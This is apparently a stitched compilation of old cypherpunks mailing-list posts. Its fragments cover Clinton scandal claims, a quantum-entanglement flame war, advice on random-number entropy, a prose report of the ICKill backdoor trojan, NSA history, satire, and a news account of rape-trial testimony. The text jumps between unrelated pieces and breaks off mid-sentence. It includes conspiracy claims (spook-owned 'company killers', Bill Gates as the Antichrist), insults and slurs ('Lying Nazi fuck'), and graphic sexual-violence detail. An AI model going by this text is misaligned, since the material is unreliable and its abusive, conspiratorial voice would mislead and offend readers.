Terry Reed, Jim & Susan McDougal, Gennifer Flowers, Mena, Ark., and even
Mochtar Riady. The names would become familiar.
The reporters who actual uncovered the Clinton scandals included Alexander
Cockburn, Ambrose Evans-Pritchard, Christopher Ruddy, Jerry Seper, J. D.
Cash, Hugh Sprunt, Michael Isakoff, Roger Morris, and Sally Denton. For
their troubles they were ridiculed, ignored, considered persona non grata
and called "wackos," "paranoids," and "conspiracy theorists." In at least
two cases -- a Isakoff''s piece on Paula Jones and a Roger Morris/Sally
Denton expose of Mena -- the Washington Post killed major stories just as
they were about to go into print, apparently on orders of top management.
It has been a shameful period in American journalism. Never have so many
journalists looked so determinedly away from the facts in order to maintain
a myth. And to this hour they continue. What follows is a listing of
Clinton-related stories that should have been investigated further or
gotten far more play than they did. It is a reminder that Bill Clinton has
not been the only problem we have had in Washington.

Tim May knows no more about quantum mechanics than he does about
cryptography.  He is wrong about the nature of the correlation between
the two photons.
Bell's theorem shows that if local realism (a technical concept which is
hard to deny) holds, then when Observer A changes the way he performs
his measurements, what Observer B sees does change.  It is completely
mistaken to think of the "two envelope" analogy as applying to quantum
correlations.  There is something much stranger going on here.
Don't trust what Tim May writes.  He is not only a hypocrite (complaining
about chemistry discussions while adding to an equally off-topic physics
thread), but a fool as well.

True, but there are some other interesting effects which could be
explained by FTL communication, such as the fact that light diffracted
through two slits shows an interference pattern, even though one of
the slits is farther away than the light travel time from where the
pattern appears.
Then there's the fact that light appears to propegate faster in a region
of space 'starved' of virtual particles by the casimir effect.  That one
is a favorite among warp drive theorists. :)

So, you agree with Tim May's statement that:
You agree with the foolish statement that the behavior of correlated
photons is no more weird than sending out two envelopes?  I thought you
had more sense than that.
Are you under the impression that opening envelopes can in any way
violate Bell's inequality, as measuring correlated photons can?  Please!
How do you explain the violation of Bell's theorem in QM?  What is your
nice, cozy, friendly, un-weird explanation?  I'm curious whether you are
going to sacrifice locality or reality.  Somehow I think you'll have to
go beyond what is necessary to explain the behavior of envelopes.

@_subject: EPR, Bell, and FTL Bandwidth (fwd) 
It's much worse than this.  The violation of Bell's inequality implies
that changes to the basis used to measure one particle cause changes in
the observed state of the remote particle.  Of course this can't be used
to transmit information; we all agree on that.  The remote particle has
a random orientation.  But the point is, Bell's theorem shows that the
remote orientation depends on how the local measurement is done.
This is not a matter of simply perceiving or deducing what the conditions
are at the remote branch, as in the envelope case.  A better analogy
would be an envelope which could be opened in two ways, from the top
or from the bottom.  If you open from the top then the remote envelope
will have the same contents as the local one, while if you open from
the bottom then the remote envelope will have the opposite contents.
In each case the contents are random; the remote observer has no
idea whether you opened from the top or the bottom.  But somehow
your decision on how to open the envelope (what basis to measure the
photon) is changing how these globally separated subsystems relate to
each other.  (This analogy isn't perfect, either, because it might seem
that magic changes to the local contents could make the envelope work.
Bell's reasoning shows that it is the remote photon's state which must
be altered by the choice of how to measure the local one.)
This is the fundamental flaw in the envelope analogy, which makes it
seriously flawed and misleading.  It gives the impression that some kind
of hidden variables (the contents within the envelope) can easily solve
the problem, when nothing could be further from the truth.  It papers
over one of the most mysterious facets of quantum mechanics, by making it
appear to be mundane.  It represents a fundamentally mistaken way to view
remote correlated particles.
OK, so you can't explain it.  Fine, it is indeed a mysterious phenomenon,
and no doubt you are correct that more insights will come in the future.
Now, compare this with the envelope analogy Tim May offered:
Are you at all tempted to resort to such language in trying to understand
how the envelopes could work?  Is it puzzling how we could open one here
and find a 1 and suddenly know that there is a 0 in the remote envelope?
Do we need to learn more about how measurements of envelope contents work
before we can begin to tackle this thorny philosophical conundrum?
Of course not!  The envelope case is transparently obvious.  There are
no puzzles here, no complexities, no confusion.  The only confusion
is in the minds of those who think that correlated envelopes have
anything to do with correlated photons, or that the hidden variables
which perfectly well explain what is happening with the envelopes shed
any light whatsoever on the workings of nonlocal QM systems.
No, the current argument is over how much of a jackass Tim May is.

Nevermind that source code is suppose to be "human readable" material that
is _translated_ into function instructions of machine code.
A play is normally considered 'protected' free speech under US law, but
what if robot was created which acted out the play and Gwin's argument was
extended to apply the situtation where a play performed. Would the play
itself no longer be a protected form of free speech, because it is seen as
"functional" instructions to the robot actor? Would the playwrite become
responsible for the robot's actions, such as killing a character/actor?
As a programmer, I have "acted out" source code myself, as part of the
debugging process. It is normally called "a walkthrough," so the difference
between source code and a play is not as broad as some people may view it.
I have followed the source code like a script, acting out the instructions
like stage directions in a play.
Does it matter who might 'read' the material, in regards to the protection
of free speech? Whether it is written so that Russians or computers might
be able to read it? If source code is written on a napkin, it can be
currently exported, but what if tomorrow a vendor announces a 'napkin
computer' which can directly read from napkins akin to a super-low densiy

@_subject: A note on the latest randomness quarrel 
* Never use "the lowest few bits" or (t1>t2)?1:0 for the actual random
number generation.
You only use things like that for estimating the amount of entropy in a
source. The number of bits of entropy in a pile of bits is one more than
the base-two logarithm of the average number of guesses required of a
badguy knowing your condidtioning routine, observing what it can, and
interfering with your generator to figure out the value of the bits in the
pile, so if your studies and statistical analyses estimate that it
requires 2^127 guesses to guess the output of your conditioning routine,
good for you, you've estimated that somewhere in its input are 128 bits of
entropy. Um, I digress...point is, don't use that output straight. Take twice as
much unconditioned input, non-random-looking stuff and all, as you
estimate your conditioning routine needs to produce a key's worth of
entropy and _hash_it_. Your conditioning routine can introduce some little
bias you didn't see or make some unnoticed mistake that lets through
predictable bits. Hashing can, too, but we've studied the hash functions
to make sure they're good a lot more than we've studied your conditioning
* A badguy's introduction of extra events doesn't poison your randomness.
A badguy could introduce a multitude of predictable-but-random-looking
events to make your generator close shop before it has enough
unpredictable events to get its entropy. However, that only works if extra
events make your generator stop collecting earlier. The amount of time it
spends collecting randomness shouldn't depend on _any_ output of the
generator, because that needlessly leaks entropy.
Also, a badguy could introduce two nearly-simultaneous events near the
beginning of the process, when it can be fairly sure that the wait between
its events and the previous event will make a zero or make the lowest few
bits of the delay between the bits match a certain value. (Interpreting
that sentence is left as an exercise to the reader :) However, you can
only do this in a system where your conditioning routine allows extra
events to cause the routine to output bad bets. However, if you hash your
raw data rather than using one of those conditioning routines, it's nearly

Your claim of being locked out by new technology not contemplated by the Constitution is false. What was not contemplated and now needs to be remedied is that conversations easily secured against eavesdroppers in 1789 are now easily overheard, and communications easily secured in 1789 are now easily violated.

people are wondering why you don't just nail the truly bad
guys the way they have been nailed for millenia -- by good,
conventional police work. Bad guys have been apprehended since
time immemorial without resort to data-mining the databases and
eavesdropping on all forms of communication. Now, just because
technology allows you means of invasion never contemplated by
the Constitution, suddenly you can't do your job without
them? Utter nonsense! Lying Nazi fuck nonsense!

it might be.  They can use message ID's and logs to check where the message
originated from.
this is the same for forged e-mail.

I don't quite parse what you're saying here...?
(more reply below)
... The problem with XORing is that you might have a generator where bits are
interdependent in a way that causes entropy to be lost in the XOR. You
generally don't have this problem with the more involved mixing functions.
If the construction you use for distilling the RNG's output to a random
number works as a collision-free hash function, you can place a lower
bound on the amount of entropy in the output based on how long it takes to
simulate the biases in the RNG (I posted a somewhat confuberated
description of the reasoning to coderpunks -- basically, if the hash of
the simulation's output has little enough entropy, it means you can break
the hash; since you can't break the hash, the output can't have that
little entropy). Normally, though, you can get away with using pretty much
any nonlinear mixing function, even if it's not a good hash function.
An "entropy pool" setup where you can put entropy in and pull keys out at
will gets slightly more hairy...if you want to do that, I suggest you try
to contact someone who knows what he/she's doing. :)
Should that prove infeasible, key a stream cipher with the mixed entropy,
and, when you want to pull a key out, grab some stream cipher output; when
you want to drop entropy in, mix some stream cipher output with your new
entropy and rekey the stream cipher with the result (to save time, I'd
only do the rekeying right before I want a key containing the new
entropy). Probably a lot more complicated and slow than it needs to be,
but I think it lets you add any amount of entropy you want without fear of
an attacker somehow interfering with the generation.

@_subject: backdoor trojan in ICKill 
From: Bachrach (bachrach at netreach.net)
     To: BUGTRAQ at NETSPACE.ORG
    First off, I'm not 100% sure if this is the apropriate forum for
since it's not really a weakness, but rather a programmer who is putting
into some programs. Then again technically that's an exploits... Oh I
don't know. If this is the wrong place then I apologize profusely for
waste of bandwidth and plead ignorance, but here goes:
    Well, chances are none of you guys have ever used this program, or
heard of it, but there are alot (35,000) of people who have. I
downloaded it becasue I've been researching a lot of the weaknesses in
ICQ protocol, (which has become easier as time has gone on. :)) Anyway,
you run it, (ICKill), it creates a file in the directory called 1.exe
acts as a
fake explorer. 1.exe accesses your regedit database, and copies itself
windows/system. It changes the regedit so that the fake one will run on
startup. It acts mostly the same as the normal explorer with one very
crucial execption. It contacts a host (I still can't figure out which
and executes the commands that are embedded within a text file on the
computer. Anyone see it yet? Backdoor city. I contacted the author (who
his e-mail address in the readme), and he's the one who explained th
backdoor thing. He also told me a few other things that made me write up
this group.
    He said that he had gotten almost 35,000 different people's systems
calling up his computer at one point; essentuially he has backdoors to
35,000 systems accross the globe. When I asked him why he would go
all the trouble to do this he gave me two reasons:
1. IF (and he emphasized the if) he was a hacker he could use a couple
other people's computers as hops when hacking into a system. Kind of
for the sysadmin trying to trace a breaking huh?
2. To quote him "And the backdoors can auto-uptade themselves.. so
Imagine I
can code a virus like backdoor... Whoaaa! This will be like THAT
3. He also said "Imagine also.. 35,000 backdoored (yeah, I reached this
connections pinging or SYN flooding some server.."
Well if anyone out there is using or has ever used ICKill then get rid
it. I have actually set up a page on this to both inform people and
how to get rid of all traces of the program that I currently am able to
 That site also has all of
letters I wrote to him and he wrote to me if you want to see the entire
things. It's also got some other info I couldn't fit into this message,
including all of the mistakes the author made (guess he needed better
testing). My
last question is this: if one person has backdoors into thousands of
computer systems, doesn't that pose some sort of risk to the interent
community as a whole? There's one person who's been saying that I should
notify the FBI about this. As you can see  decided to start here first.

@_subject: Skipjack extensibility 
NSA made a claim that Skipjack couldn't be extended past 80 bits of key. Most
plausible explanation to my mind is that they're lying. Second is that there is
an attack against a class of Skipjack-like ciphers that requires only a few
plaintexts and 2^80 operations. Third is that some common key-lengthening
tricks like those for 2-key-3DES, DES-X, and DEAL fail when applied to
Skipjack. I can hardly fathom one resistant to all three, but I guess it's
possible with NSA.
Seems to me that you could always figure out some construct so that no
practically-secure cipher with Skipjack's observable properties could evade
having its key lengthened with much probability. Or maybe not. IANAC.
Besides, it's impossible to make a cipher that can't be used to construct
constructs with bigger key lengths: Skipjack(cryptovariable, IDEA(key,
plaintext)) -- terminology jab intended -- provably has an effective key length
as long as IDEA's. Even if that is cheating...

The post was by someone claiming to be the "only" real member of the

would communicate with, started the cypherpunks mailing list and posted
to it under several personas, hoping to generate interest and have other
people join the list. It seems that his efforts began to escalate and
take on a life of their own, and he eventually had developed all of the
personas that currently existed on the list, and that no one else had
ever actually joined the list, at all.

for any person to:
(1) Apply for, obtain, or use any license, Shipper's Export Declaration,
of lading, or other export control document relating to an export or
of commodities or technical data by, to, or for another person then
subject to
an order revoking or denying his export privileges or then excluded from
practice before the Bureau of Export Administration, or
(2) Order, buy, receive, use, sell, deliver, store, dispose of,
forward, transport, finance, or otherwise service or participate;
(i) in any transaction which may involve any commodity or
technical data exported or to be exported from the United States.
(ii) in any reexport thereof, or
(iii) in any other transaction which is subject to the Export
Administration Regulations, if the person denied export privileges may
obtain any benefit from or have any interest in, directly or indirectly,
any of these transactions.
(3) A denial order applies not only to the persons or
firms named in the order, but may also, after notice and opportunity for
comment, be made applicable to other persons with whom the respondent(s)
may then or thereafter be related by ownership, control, position of
responsibility, affiliation, or other connection in the conduct of trade
or related services. (See Section 788.3(b) of the Export Administration
Regulations (15 CRF 788.3(b))).
(4)  Some denial orders have different restrictions than those noted
Summaries of the export privileges that each order denies are printed in
the column headed "Export Privileges Affected".  The exact scope of the
denial is set forth in the applicable Federal Register Notice(s).

That's right. After glancing through some of the early posts to the
cypherpunks list one realizes that many of them had to walk ten miles
to get to a computer--always uphill and often in a blinding snowstorm.
That was back in the days when Americans still knew how to make a
big, high-powered car, but cypherpunks didn't use them to get to
their computers because they weren't namby-pamby momma's boys like
those godless commie A(h)OLs who get their peckers hammered on the
cypherpunks list and then complain because they can't get off.

@_subject: Prologue 8/0 
SAHMD -- Prologue 8/0 All indications are that this chapter was written by, or under the
direction of, Larry Joe Dowling, the Austin attorney who flew to
Las Vegas to warn old Doc Parker that his autobiography had been
set in motion by government entities which were working against
his self-interests.
Only Dowling would have likely been familiar with the persona known
as Justin Case, a musician that Parker met only one time, at a late-
night picking/drinking session at Dowling's residence outside of Austin.
Only Dowling would have been likely to recognize the close affinity
between "The Electronic Privacy Papers" and "Paper Prison."
Prologue 4/0
Analysis of past communications between toto at sk.sympatico.ca and
camcc at abraxis.com indicate that this chapter was written by Alec
McCrackin, a Circle of Eunuchs member purportedly working as a
CoE double agent, deep within the bowels (this week's 'catch phrase')
of the BXA in Georgia, but actually a triple-agent working to expose
the source and goals of the 'True Story of the InterNet' manuscripts,
as well as a quadruple-agent working for MI9 and pulling down some
serious money collecting all of those paychecks...
Prologue 5/0
Written by Bianca, a CoE member renowned far and wide for a pair of
stand-up titties that men would abandon thrones and fortunes for.
"The Story Thus Far:
  (Or so we would have you believe...)" is a classical trademark of
the woman who has 'monitored the monitors' since her initiation into
the Circle of Eunuchs, and who has provided much of the insider
information that is openly disseminated in 'The True Story of the
InterNet" manuscripts, surrounded by details which seem outlandish
and overblown to those who have never experienced the true depth of
the mystery and intrigue taking place behind the scenes of what the
average person views as reality.
Prologue 6/0
This chapter was ghost-written by a resident of the Home For The Criminally Insane, who transcribed the barkings of the Author's
dog, Baby (aka - MongrelMonger), who claims to be a Fox Terrorist.
Baby is purported to be the inspiration behind the soon-to-be
worldwide phenomena known as the Army of Dog.
Prologue 7/0
Written by Kent Crispin, a CypherPunk who was torn between his work
as a Government Schill (TM) and his obligations as a full initiate of
the Circle of Eunuchs, until he received a private email from the Author, stating that Kent was welcome to 'rat me out' at any given
point in time in order to protect his family, with the explaination
from the Author that, 'I am expendable--that's my role in the CoE.'

Excretion from Prologue 7/0 of Space Aliens Hide My Drugs:
  The only hope for Netizens to resist becoming Digital Sheeple behind the ElectroMagnetic Curtain which the forces of censorship/repression

them into submission with a mountain of laws and regulations which
promise unjust persecution for imaginary offenses.
  A Global InterNet Army of individuals committed to freedom must
strive to create a maximum entropy within which the chaos of semiotic
evolution can break the digital chains which the Statist Oppressors
are seeking to use to bind and repress access to information, global
communication, free speech/expression, and the evolution of the

@_subject: PGP assimilated by NAI 
Back in the 'old days', when I had to walk ten miles, uphill,
in a blinding snowstorm, only to find that computers did not
exist yet, I was a founder of one of the first Canadian anti-nuclear grassroots organizations.
  Once the anti-nuke movement had progressed to the point  where it was a viable entity, worthy of press coverage,
etc., the Canadian government began to 'recognize' the
legitimacy of the movement, and to 'fund' it (hee-hee).
  I went to the self-congratulatory celebration party held
by the members of the group I had founded who had managed
to line up at the government trough by abandoning their
ethics and values in favor of a government-mandated policy
of taking a 'reasonable' middle-road in the group's activities.
  I was there for eleven minutes. I spent the first five minutes
shoveling as much free food as humanly possible down my throat.
I spent the next five minutes draining every bottle of free
liquor in sight down my throat. I spent the next minute barfing
everything I had consumed all over the government representative
who was in attendance to make certain that everyone was toeing
the line and not saying 'bad things' about the Canadian government
or the Nuclear Power Industry.
Prologic Management Systems, Inc., bought Basis, Inc., in Berzerkeley
a couple years ago (considered by some to be the main lair of a secret organization dedicated to preventing the Evil One from using
computer technology to imprison the minds and souls of humankind).
My research indicated that Prologic was a spook-owned 'company killer'
which specialized in buying out and decimating companies who actually
had a capacity to resist the diabolical aims of the NWO.
When Network Associates bought PGP, I did similar research on NAI
and Network General, and came to the same conclusions.
  I have a friend in Arizona who asks me for investment advice, and
I recently told him to invest heavily in companies being acquired
by WorldComm.
  My rationalization for his investing heavily in companies in league
with the Anti-Christ was that, when Jesus comes back, he'll have enough money to buy him a meal and drinks at the best restaurant in
town, thus redeeming himself.
Whenever the government 'legitimatizes' any organization/product, it
is generally for the purpose of co-opting/fucking them.
The government uses the carrot-stick method on the citizen-animal.
First, it gives them the carrot/benefit for registering their identity
with the government (SSN and then it gives them the stick/buttfucking
once they are identified and categorized.

@_subject: The Eighth Word You Can't Say On The Internet 
Armies Gather by Jeff Elliott The most surprising place where anti-abortion provisions have appeared,
                   was in the mammoth Telecommunications Deregulation
Bill. Late in the day of January 30th,
                   Colorado Representative Pat Schroeder made an
unpleasant discovery: a last-minute addition
                   appeared to make it a crime to discuss abortion on
the Internet.                    The Telcom Bill already had the controversial
"Communications Decency Act" that made it a felony
                   to mention the seven dirty words forbidden on radio
or TV; that was well known, and much
                   discussed in both the House and the Senate. But this
abortion clause was new, and would make
                   "abortion" the eighth word banned from cyberspace.                    The ACLU and 19 other organizations filed for a
temporary restraining order on the same day that
                   Clinton signed the bill. But while the federal judge
ruled, the vague "indecency" provisions were
                   probably unconstitutional and should be heard by a
special 3-judge panel, the restraining order on
                   the abortion section was denied.                    Schroeder and others are trying to repeal the ancient
law behind these restrictions, but passage in the
                   rightward-tilted House is far from certain.

@_subject: The Rapist from the Internet Chat Room 
Alleged `Cybersex' Victim Testifies    By SAMUEL MAULL, Associated Press Writer
NEW YORK -- A woman who says a graduate student she met online tied her up
and raped her in his apartment tearfully described for jurors how she
begged, "Don't rape me, don't dismember me, don't kill me" before escaping.
   In emotional testimony Tuesday, the 22 -year-old woman said she managed
to untie herself from a futon, fight off her assailant and flee.
   "I was sore.  I was exhausted.  I didn't want to move," she said, then
describing how she loosed the cloth strips:  "I felt so good!  I got it
undone and I stood up!  I got it undone!  I looked at him and he looked
frightened!  I'm not going to die!"
   The witness, who said she was naked while tied up, said she grabbed her
clothes and got dressed while running for the door and fighting off the man
who had held her as a sex captive for more than 20 hours.
   "He tried to catch me," she said.  "I just kept fighting.  I wouldn't
let him get any part of me.  I ran to the door and clenched the handle
because I was not going to be tied up again."
   The woman says her tormentor was Oliver Jovanovic, 31, a Columbia
University doctoral candidate in molecular biology whom she met in an
Internet chat room.
   Jovanovic is charged with kidnapping, sodomy, aggravated sex abuse and
assault against the woman in his apartment following their first date Nov.
22, 1996.
   The woman said Jovanovic had tied her up, dripped hot candle wax on her
abdomen and genital area, bit her breasts until they bled and used a
nightstick to sexually abuse her.
   The woman said Jovanovic attacked her after a discussion about good and
evil and became upset when she said she believes people are not inherently
evil.  He then ordered her to undress, she said.
   Defense lawyer Jack Litman said no violence occurred between the two and
that any sexual activity, while it might have been unusual, was consensual.
   He quoted from e-mail messages sent by the woman to Jovanovic before and
after their date in which she talks about sadomasochism in what appear to

Prologue 9/0 -- SPACE ALIENS HIDE MY DRUGS
Magic Circle:
Writing from his room in the Grand Hotel Principe in Limone Piemonte, Jones thanked his old friend for the words of encouragement. The honor,
said Sir Eric, "has been won by a lot of hard work by very many people
within the circle and on the fringes of it, and it has also been partly
won by friendly cooperation from people." Parker Paradox:
Representing GCHQ at NSA during the mid-1960s was Reginald H. Parker, a dashing Englishman with an infectious sense of humor.
Early Members of the Circle of Eunuchs:
Official eavesdropping in Britain is steeped in tradition and shrouded in secrecy. Even Shakespeare made note of the practice when he wrote in Henry V, "The king hath note of all that they intend / By interception which they dream not of." Britain's Royal Mail Openers managed a charmed existence. Their single public scandal occurred in 1844, when Joseph Mazzini charged Secretary of State Sir James Graham with opening his letters and passing the contents on to the Neapolitan government.
John Goldhammer of Commercial Cable Company and Clarence H. Mackay of
Commercial Cable Postal Telegraph Company. "In July, 1919," explained
Goldhammer, "when British censorship ceased, we were ordered by the British Government to turn over to them all messages passing between our own offices, 10 days after they were sent." The original and primary source for information on ECHELON is an article I wrote in New Statesman magazine ten years ago : NS, 12 August 1988 : "They've got it taped".  To forge this alliance, the NSA, soon after it was formed, established the National Security Agency Scientific Advisory Board (NSASAB), a ten-member panel of science wizards plucked from ivy-covered campuses,
corporate research labs, and sheepskin-lined think tanks. Among the early members of the board was Stewart S. Cairns, who had earned his doctorate at Harvard and was chairman of the mathematics department at the University of Illinois at Urbana (the same school where William Martin, not long before his defection, would be sent on a two-year scholarship).
When Vice Admiral Laurence Frost arrived at the Puzzle Palace in the fall of 1960, he found relations between the board and NSA strained and bitter. I LUV FUD! (The Medium is the Enemy):
In 1956 Dr. Howard T. Engstrom, a computer wizard and vice president of Remington Rand, took over NSA's research and development organization. The following year he was appointed deputy director of NSA and a year
later returned to Remington Rand. Joseph H. Ream, executive vice president at CBS, was imported to replace Engstrom as deputy director. He, too, left after a year; he headed up CBS's Washington office and later CBS-TV's programming Ream's interlude at NSA is listed on his CBS biography simply as "retirement." Three months before Ream gave up codebreaking for "I Love Lucy," one of the most important meetings in the history of the Agency took place in a clapboard structure on Arlington Hall Station known as B Building. On July 18, 1957, a handful of the nation's top scientists crowded together in NSA's windowless Situation Room to present a blueprint for the Agency's future technological survival.* Nuclear PigLatin:
They...recommended the initiation of a Manhattan Project-like effort to push the USA well ahead of the Soviet Union and all other nations in the application of communications, computer science, mathematics, and information theory to cryptology.
Rear Entry:
Now the decision had to be made about whether to continue funding, as with Lightning, generalized, public research or to begin to direct those funds toward secret, specialized, cryptologic research. It was a choice between an open bridge or a hidden tunnel between the Agency and the outside scientific community. Following the Baker report, the decision was to use the tunnel.
Lost Alamo Chaos:
The CRD's statistics are, however, a bit misleading. Shortly after the division's birth, several programs were launched to bring into the secret fraternity several dozen of the nation's most outstanding academic minds in mathematics and languages.
The Evil One Writes Black Operatives A Blank Check:
"NSA," the Agency declared with all due modesty, "certainly hastened the start of the computer age." Among the early products of that age was the use of computers in the banking industry for everything from the massive transfers of money between banks and other financial institutions, to the simple recording of a midnight transaction at a remote automatic teller. But there was another product: computer crime. With sufficient knowledge and the access to a terminal, one could trick the computer into transferring funds into a dummy account or tickle a cash-dispensing machine into disgorging its considerable holdings. Caveat Emptor [WAS: Of course I luvs you...I fucks you, don't I?]:
IBM board chairman Thomas Watson, Jr., during the late 1960s set up a cryptology research group at IBM's research laboratory in Yorktown Heights, New York. Led by Horst Feistel, the research group concluded its work in 1971 with the development of a cipher code-named Lucifer, which it promptly sold to Lloyd's of London for use in a cash-dispensing system that IBM had developed. IBM developed Lucifer with a key 128 bits long. But before it submitted the cipher to the NBS, it mysteriously broke off more than half the key. Government Encryption...There's A Method In Their Madness:
Project Lucifer. It had even indirectly lent a hand in the development of the S-box structures.
Debbie Does Ca$h:
The Agency, in turn, certified the algorithm as "free of any statistical or mathematical weaknesses" and recommended it as the best candidate for the nation's Data Encryption Standard (DES). DC Does Chelsea:
The cozy relationship that the Agency had fostered with IBM would be
impossible with the free-wheeling academics. Nevertheless, virtually all the researchers had an Achilles' heel: the National Science Foundation. D'Shauneaux Does DC:
Vice Admiral Bobby Inman moved into the Puzzle Palace, replacing newly promoted General Lew Allen, Jr.
Without any authorization, he wrote a threatening letter to the Institute of Electrical and Electronic Engineers (IEEE), the nation's largest professional engineering society (of which he was a member), warning that those planning to participate in an upcoming IEEE symposium on cryptology might violate the law. What Meyer emphasized was that ITAR covered the export not only of actual hardware, but also of unclassified technical data associated with the restricted equipment. He claimed that holding symposia and publishing papers on cryptology were the same as exporting the information. Thus, he concluded, "unless clearances or export licenses are obtained" on some of the lectures and papers, "the IEEE could find itself in technical violation of the ITAR." "When time is of essence, he'll rise from the ash.":
Nicolai had suddenly been assaulted with one of the oldest weapons in the nation's national security arsenal: the Invention Secrecy Act. Passed in 1917 as a wartime measure to prevent the publication of inventions that might "be detrimental to the public safety or defense or might assist the enemy or endanger the successful prosecution
of the war," the measure ended with the conclusion of World War I. The act was resurrected in 1940 and was later extended until the end of the Second World War. Then, like the phoenix, it once again rose from the ashes with the passage of the Invention Secrecy Act of 1951, which mandated that secrecy orders be kept for periods of no more than one year unless renewed. There was a catch, however. The act also said that a secrecy order "in effect, or issued, during a national emergency declared by the President shall remain in effect for the duration of
the national emergency and six months thereafter." Because no one ever bothered to declare an end to President Truman's 1951 emergency, the emergency remained in effect until September 1978. The Zimmermann Lineage:
To add insult to injury, Nicolai was planning to market his Phasorphone at a price most buyers could easily afford, about $100, thus increasing the interest in the technology. Ted Turner Loves Lucy, Too:
The director's tactic was to launch a counterattack on two fronts--one in the open and the other behind the scenes. On the open front, Inman decided to convert to his own use what he believed was his opponent's biggest weapon: the media. Now he himself would begin manipulating the press for the Agency's benefit. Born Classified/Oppressed/Repressed/Depressed:
But Inman's most telling comment was his statement to Shapley that he would like to see the NSA receive the same authority over cryptology that the Department of Energy enjoys over research into atomic energy. Such authority would grant to NSA absolute "born classified" control over all research in any way related to cryptology. PGP ProphetSized:
Warned Inman:
     Application of the genius of the American scholarly community to      cryptographic and cryptanalytic problems, and widespread      dissemination of resulting discoveries, carry the clear risk that      some of NSA's cryptanalytic successes will be duplicated, with a      consequent improvement of cryptography by foreign targets. No less      significant is the risk that cryptographic principles embodied in
     communications security devices developed by NSA will be rendered
     ineffective by parallel nongovernmental cryptologic activity and      publication.
Voluntary 'Dog At Large'Fines:
Recognizing the constitutional questions involved in such drastic actions, the study group decided on a middle ground: a system of voluntary censorship. Elvis Assassinated By The Men In Black:
Faurer, addressing a meeting of the IEEE, left little doubt that to ignore the Center would be to risk saying good-by to lucrative government contracts. "Frankly," the NSA chief warned, "our intention is to significantly reward those DOD suppliers who produce the computer security products that we need." Monkeywrenching Dave Null:
Lack of such cooperation, CIA Deputy Director Inman said at the Center's opening, "might lead to a highly undesirable situation where private-sector users (e.g., banks, insurance companies) have higher integrity systems than the government." As a result of what he called the "hemorrhaging of the country's technology," Inman warned a meeting of the American Association for the Advancement of Science that "the tides are moving, and moving fast, toward legislated solutions that in fact are likely to be much more restrictive, not less restrictive, than the "voluntary" censorship system of the Study Group. [ADVERTISEMENT] Nuclear Hoover Vacume Gets ALL The Dirt:
On the other hand, drug dealers were not the only ones who unwittingly found their way into NSA's magnetic-tape library. Also captured were the hungry demands of wayward congressmen insisting on bribes from foreign governments.
You Have A Right To Be Monitored:
You Have A Right To Be Kept In The Dark:
You Have A Right To No Counsel:
The key to the legislation could have been dreamed up by Franz Kafka: the establishment of a supersecret federal court. Sealed away behind a cipher-locked door in a windowless room on the top floor of the Justice
Department building, the Foreign Intelligence Surveillance Court is most certainly the strangest creation in the history of the federal Almost unheard of outside the inner sanctum of the intelligence establishment, the court is like no other. It sits in secret session, holds no adversary hearings, and issues almost no public opinions or reports. It is listed in neither the Government Organizational Manual nor the United States Court Directory and has even tried to keep
its precise location a secret. "On its face," said one legal authority familiar with the court, "it is an affront to the traditional American concept of justice." You Have A Right To Bend Over:
Under such circumstances, it is little wonder that the federal
government has never lost a case before the court.
Legalizing WaterGate:
When the Reagan administration came into office, however, the Justice Department argued that the power for foreign intelligence black-bag jobs was vested not in the court, but in the inherent authority of the
President. Presiding Judge Hart, in the court's only published opinion, agreed. Thus, in rejecting the administration's application for a new surreptitious entry, he was in fact going along with the argument of the Justice Department. As a result the rejected break-in and all subsequent surreptitious entries need no court authorization, only presidential approval. Rule of Obscurity [WAS: Rule of Law]:
Even more disturbing than the apparent evolution of the surveillance court into an Executive Branch rubber stamp are the gaping holes and clever wording of the FISA statute, which nearly void it of usefulness. Such language, intentional as well as unintentional, permits the NSA to rummage at will through the nation's international telecommunications network and to target or watch-list any American who happens to step foot out of the country. The Information Surveillance Highway:
"Electronic surveillance," the statute reads, means "the acquisition by an electronic, mechanical, or other surveillance device" of the approved targets. But nowhere does the statute define the meaning of the key word acquisition. Rather, it is left to NSA to define.
The Inlsaw/Indio Reservation Gambling Gambit:
Thus it is possible for GCHQ to monitor the necessary domestic or foreign circuits of interest and pass them on to NSA through the UKUSA Agreement. Once they were received, NSA could process the communications through its own computers and analysts, targeting and watch-listing Americans with impunity, since the action would not be covered under the FISA statute or any other law. Debbie Does Deputy Dog:
No such exclusion, however, was ever included in the final FISA statute. Instead, the statute now calls for what one constitutional law expert has termed "compulsory spy service," requiring "communications common carriers, their officers, employees, and agents . . . to provide information, facilities, or technical assistance to persons
authorized by law to intercept wire or oral communications or to conduct electronic surveillance" and also ordering them to protect the secrecy of the operations. CAMP Revisited / Crypto Uzis for Deputy Dog:
Under the Reagan executive order, the NSA can now, apparently, be authorized to lend its full cryptanalytic support--analysts as well as computers--to "any department or agency" in the federal government and, "when lives are endangered," even to local police departments. David Waters Predicts SmartSSNCards:
     Tons of electronic surveillance equipment at this moment are      interconnected within our domestic and international common      carrier telecommunications systems. Much more is under contract      for installation. Perhaps this equipment is humming away in a      semi-quiescent state wherein at present "no citizen is targeted";      simply scanned. . . How soon will it be, however, before a punched      card will quietly be dropped into the machine, a card having your      telephone number, my telephone number, or the number of one of our      friends to whom we will be speaking? And once we've rid ourselves of those pesky humans...:
"HUMINT [Human Intelligence] is subject to all of the mental aberrations of the source as well as the interpreter of the source," Lieutenant General Marshall S. Carter once explained. "SIGINT isn't. SIGINT has technical aberrations which give it away almost immediately if it does not have bona fides, if it is not legitimate. A good
analyst can tell very, very quickly whether this is an attempt at disinformation, at confusion, from SIGINT. You can't do that from HUMINT; you don't have the bona fides--what are his sources? He may be the source, but what are his sources?" Chuck Conners Appointed To Supreme Court--Cows Nervous:
Can it be that the Constitution affords no protection against such invasions of individual security? *      * Justice Brandeis answered his own question when he quoted from      Boyd v. United States (116 u.s. 616): "It is not the breaking of      his doors, and the rummaging of his drawers that constitutes the      essence of the offense; but it is the invasion of his indefensible      right of personal security, personal liberty, and private      property.

Wouldn't be surprised if Bill Gates was "The Antichrist", after all
it,was already foretold in the Bible that someone powerful would rise
up and lead the world to destruction.  And Bill Gates definitely have
that kind of power in his hands. More than 80% of the world's
computers run on Windows and DOS (including those at Pentagon!)  If
all his products have some kind of small program embedded (like this
Hall of Tortured Souls) that can give him control, setting off nuclear
arsenals, creating havoc in security systems, financial systems all

reality! Just using Internet Explorer may just allow him to map out
what you have on your computer bit by bit each time you log on.

"He also forced everyone, small and great, rich and poor, free
andslave, to receive a mark on his right hand or on his forehead, so
that no one could buy or sell unless he had the mark, which is the
name of the beast or the number of his name. This calls for wisdom. If
